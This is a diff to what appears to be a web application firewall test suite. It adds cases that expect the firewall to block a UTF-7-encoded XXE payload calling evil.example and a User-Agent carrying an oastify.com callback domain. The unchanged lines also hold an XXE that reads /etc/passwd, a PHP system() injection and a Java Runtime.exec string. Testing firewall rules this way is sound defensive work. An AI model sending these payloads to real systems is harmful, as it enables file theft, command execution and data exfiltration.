@@ -52,6 +52,11 @@ ATTACKS = [
     # XML external entity (local rule 10030, found missing with GoTestWAF)
     Case("XXE in an XML body", "xxe", "POST", "/import", 403, headers={"Content-Type": "application/xml"},
          data='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'),
+    Case("XXE hidden with UTF-7", "xxe", "POST", "/import", 403, headers={"Content-Type": "application/xml"},
+         data='<?xml version="1.0" encoding="UTF-7"?>\n+ADwAIQ-DOCTYPE foo+AFs +ADwAIQ-ELEMENT foo ANY +AD4\n'
+              '+ADwAIQ-ENTITY xxe SYSTEM +ACI-http://evil.example:1337+ACI +AD4AXQA+\n+ADw-foo+AD4AJg-xxe+ADsAPA-/foo+AD4\n'),
+    # Out-of-band callback domain (local rule 10040)
+    Case("Callback domain in User-Agent", "oast", "GET", "/", 403, headers={"User-Agent": "Mozilla/5.0 x.abc123.oastify.com"}),
     # PHP and Java
     Case("PHP code injection", "php", "GET", "/api/search", 403, params={"q": "<?php system($_GET['c']); ?>"}),
     Case("Java deserialization gadget", "java", "POST", "/api/comments", 403, json={"text": "java.lang.Runtime.getRuntime().exec('id')"}),
